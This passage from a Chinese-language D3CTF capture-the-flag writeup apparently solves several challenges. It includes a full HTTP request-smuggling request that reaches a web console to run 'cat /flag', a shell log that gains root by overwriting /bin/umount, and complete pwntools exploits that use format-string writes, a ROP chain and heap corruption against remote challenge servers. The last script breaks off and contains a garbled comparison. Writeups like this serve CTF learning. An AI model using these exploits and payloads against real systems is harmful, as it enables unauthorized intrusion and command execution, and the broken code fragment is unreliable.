然后就能改admin密码了, admin testpass123
登陆进去后要求客⼾端的来源ip为内⽹ip，试了各种伪造ip的请求头都不⾏
然后发现 Server: ATS/7.1.2  ，搜了下发现这个版本存在请求⾛私
https://mengsec.com/2019/10/10/http-request-smugging/
然后发现⽂章中的测试环境跟题⽬的很像
最后利⽤CLZTE完成请求⾛私
POST / HTTP/1.1 
Host: [ec057b43d9.showhub.d3ctf.io](http://ec057b43d9.showhub.d3ctf.io/) 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6 
Cookie: PHPSESSID=uaoq5ec3gnqtadteh4ejf1pdt8§§ 
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 658 
Transfer-Encoding: chunked 
0 
POST /WebConsole/exec HTTP/1.1 
Host: [ec057b43d9.showhub.d3ctf.io](http://ec057b43d9.showhub.d3ctf.io/) 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 
Referer: [http://ec057b43d9.showhub.d3ctf.io/WebConsole/](http://ec057b43d9.showhub.d3ctf.io/WebConsole/) 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6 
Cookie: PHPSESSID=uaoq5ec3gnqtadteh4ejf1pdt8 
Connection: close 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 16 
cmd=cat+/flag&a=
D3CTF Writeup
13
Pwn
knote
全盘rwx....
/ $  rm /bin/umount 
 rm /bin/umount 
/ $ echo '#!/bin/sh' > /bin/umount 
echo '#!/bin/sh' > /bi[   23.319387] random: fast init done 
n/umount 
/ $ echo '/bin/sh' >> /bin/umount 
echo '/bin/sh' >> /bin/umount 
/ $ chmod +x /bin/umount 
chmod +x /bin/umount 
/ $ exit 
exit 
/bin/sh: can't access tty; job control turned off 
/ # cat /flag 
cat /flag 
d3ctf{mutli_thread_JO00p_Ro0op}/ #
D3CTF Writeup
14
unprintableV
栈上可以做printf的那个链 然后栈任意写
栈布局刚好可以做csu_init 
r12是bss段的.....stdin在bss上.....⼤概可以整出来⼀个open ?
可以把stdout指针改成stderr打出来
from pwn import * 
#p = process('./unprintableV') 
p = remote('212.64.44.87', 12604) 
p.recvuntil('here is my gift: 0x') 
stack = int(p.recv(12),16) 
print hex(stack) 
p.recvuntil('may you enjoy my printf test!') 
buf_ptr = stack 
pay1 = "%"+str(buf_ptr&0xff)+"c%6$hhn" 
print pay1 
p.send(pay1.ljust(300,'\x00')) 
pay2 = "%32c%10$hhn" 
p.send(pay2.ljust(300,'\x00')) 
pay3 = "%1664c%9$hn" 
p.send(pay3.ljust(300,'\x00')) 
p.sendline("%15$p%14$p\x00") 
p.recvuntil("0x") 
addr = int(p.recv(12),16) 
print hex(addr) 
p.recvuntil("0x") 
addr2 = int(p.recv(12),16) 
print hex(addr2) 
libc_base = addr - (0x7f73b7bddb97-0x7f73b7bbc000) 
sh = libc_base +1785498 
gets = libc_base + 524464 
base = addr2 - (0x00055B74A2C6B60-0x00055B74A2C6000) 
b_pop_rdi = base+0x0000000000000bc3 
pop_rdi = libc_base + 0x000000000002155f 
pop_rsi = libc_base + 0x0000000000023e6a 
pop_rdx = libc_base + 0x0000000000001b96 
pop_rcx = libc_base + 0x000000000003eb0b 
pop_rax = libc_base + 0x00000000000439c8 
syscall = libc_base + 0x00000000000d2975 
pay4 = "%"+str((buf_ptr+0x18+1)&0xff)+"c%6$hhnHOMURA" 
print pay4 
p.send(pay4+'\x00\n') 
p.recvuntil('HOMURA') 
pay5 = "%"+str((buf_ptr >> 8)&0xff)+"c%10$hhnHOMURA" 
p.send(pay5+'\x00\n') 
D3CTF Writeup
15
p.recvuntil('HOMURA') 
pay6 = "%"+str((buf_ptr+0x20)&0xff)+"c%6$hhnHOMURA" 
p.send(pay6+'\x00\n') 
p.recvuntil('HOMURA') 
pay7 = "%"+str((gets)&0xff)+"c%10$hhnHOMURA" 
p.send(pay7+'\x00\n') 
p.recvuntil('HOMURA') 
pay6 = "%"+str((buf_ptr+0x20 +1)&0xff)+"c%6$hhnHOMURA" 
p.send(pay6+'\x00\n') 
p.recvuntil('HOMURA') 
pay7 = "%"+str((gets >> 8)&0xff)+"c%10$hhnHOMURA" 
p.send(pay7+'\x00\n') 
p.recvuntil('HOMURA') 
pay6 = "%"+str((buf_ptr+0x20 +2)&0xff)+"c%6$hhnHOMURA" 
p.send(pay6+'\x00\n') 
p.recvuntil('HOMURA') 
pay7 = "%"+str((gets >> 16)&0xff)+"c%10$hhnHOMURA" 
p.send(pay7+'\x00\n') 
p.recvuntil('HOMURA') 
pay6 = "%"+str((buf_ptr+0x20 +3)&0xff)+"c%6$hhnHOMURA" 
p.send(pay6+'\x00\n') 
p.recvuntil('HOMURA') 
pay7 = "%"+str((gets >> 24)&0xff)+"c%10$hhnHOMURA" 
p.send(pay7+'\x00\n') 
p.recvuntil('HOMURA') 
pay6 = "%"+str((buf_ptr+0x20 +4)&0xff)+"c%6$hhnHOMURA" 
p.send(pay6+'\x00\n') 
p.recvuntil('HOMURA') 
pay7 = "%"+str((gets >> 32)&0xff)+"c%10$hhnHOMURA" 
p.send(pay7+'\x00\n') 
p.recvuntil('HOMURA') 
pay6 = "%"+str((buf_ptr+0x20 +5)&0xff)+"c%6$hhnHOMURA" 
p.send(pay6+'\x00\n') 
p.recvuntil('HOMURA') 
pay7 = "%"+str((gets >> 40)&0xff)+"c%10$hhnHOMURA" 
D3CTF Writeup
16
p.send(pay7+'\x00\n') 
p.recvuntil('HOMURA') 
#gets ok 
pay6 = "%"+str((buf_ptr+0x10)&0xff)+"c%6$hhnHOMURA" 
p.send(pay6+'\x00\n') 
p.recvuntil('HOMURA') 
pay7 = "%"+str((195)&0xff)+"c%10$hhnHOMURA" 
p.send(pay7+'\x00\n') 
p.recvuntil('HOMURA') 
last = 'd^3CTF'.ljust(0x10,'\x00') 
last += "flag" 
p.send(last.ljust(300,'\x00')) 
#0x000000000002155f : pop rdi ; ret 
#0x0000000000023e6a : pop rsi ; ret 
#0x0000000000001b96 : pop rdx ; ret 
#0x000000000003eb0b : pop rcx ; ret 
#0x00000000000439c8 : pop rax ; ret 
#0x00000000000d2975 : syscall ; ret 
#0x0000000000155fc6 : pop r8 ; mov eax, 1 ; ret 
pop_r8  = libc_base +0x0000000000155fc6 
rop = p64(pop_rdi) 
rop +=p64(base+0x202070) 
rop +=p64(pop_rsi) 
rop +=p64(0) 
rop +=p64(pop_rdx) 
rop +=p64(0) 
rop +=p64(pop_rax) 
rop +=p64(2) 
rop +=p64(syscall) 
#open 
rop +=p64(pop_rdi) 
rop +=p64(1) 
rop +=p64(pop_rsi) 
rop +=p64(base+0x202080) 
rop +=p64(pop_rdx) 
rop +=p64(100) 
rop +=p64(pop_rax) 
rop +=p64(0) 
rop +=p64(syscall) 
#read 
rop +=p64(pop_rdi) 
rop +=p64(2) 
rop +=p64(pop_rsi) 
rop +=p64(base+0x202080) 
rop +=p64(pop_rdx) 
rop +=p64(100) 
rop +=p64(pop_rax) 
rop +=p64(1) 
rop +=p64(syscall) 
#write 
p.sendline('a'*24+rop) 
p.interactive()
new_heap
getchar() 会申请01000的chunk
from pwn import * 
ru = lambda x: p.recvuntil(x, drop = True) 
sa = lambda x,y: p.sendafter(x,y) 
sla = lambda x,y: p.sendlineafter(x,y) 
D3CTF Writeup
17
def alloc(size,cnt): 
    sa("3.exit\n",str(1).ljust(0x7,'\x00')) 
    sa("size:",str(size).ljust(0x7,'\x00')) 
    sa("content:",cnt) 
def free(idx): 
    sa("3.exit\n",str(2).ljust(0x7,'\x00')) 
    sa("index:",str(idx).ljust(0x7,'\x00')) 
    ru("done\n") 
def qu(byte): 
    sa("3.exit\n",str(3).ljust(0x7,'\x00')) 
    sa("sure?\n",byte) 
def exp(): 
    try: 
        global p 
        # p = process("./new_heap",env={"LD_PRELOAD":"./libc.so.6"}) 
        HOST,PORT = '49.235.24.33','20201' 
        p = remote(HOST,PORT) 
        libc = ELF("./libc.so.6") 
        ru("friends:0x") 
        byte = int(ru('\n'),16)-0x2 
        log.info('byte:'+hex(byte)) 
        alloc(0x78,'0'*0x78) 
        alloc(0x78,'1'*0x78) 
        alloc(0x78,'2'*0x78) 
        alloc(0x78,'3'*0x78) #3 
        alloc(0x78,'\x00'*0x58+p64(0x81)) #5 
        alloc(0x38,'5'*0x38) #5 
        alloc(0x78,'\x00'*0x18+p64(0x61)) #7 
        alloc(0x78,'7'*0x70) #8 
        alloc(0x78,'8'*0x70) #8 
        free(0) 
        free(1) 
        free(2) 
        free(3) 
        free(4) 
        free(6) 
        free(7) 
        free(8) 
        alloc(0x78,'\x00'*0x28+p64(0x51)) #10 
        free(8) 
        alloc(0x78,'\xb0'+chr(byte+0x4)) #11 
        ru("done\n") 
        qu('\xe1') 
        free(5) 
        alloc(0x18,'x'*0x18) #12 
        ru("done\n") 
        alloc(0x8,'\x50\x77') #13 
        ru("done\n") 
        alloc(0x38,'\n') #14 
        ru("done\n") 
        alloc(0x38,2*p64(0)+p64(0xfbad1800)+p64(0)*3+p8(0)) #15 
        p.recv(8) 
        libc.address = u64(p.recv(8))-0x3b5890 
        log.info("libc.address:"+hex(libc.address)) 
        system = libc.sym['system'] 
        if libc.address0x800000000000: 
            return 
            p.close() 
        log.info('system:'+hex(system)) 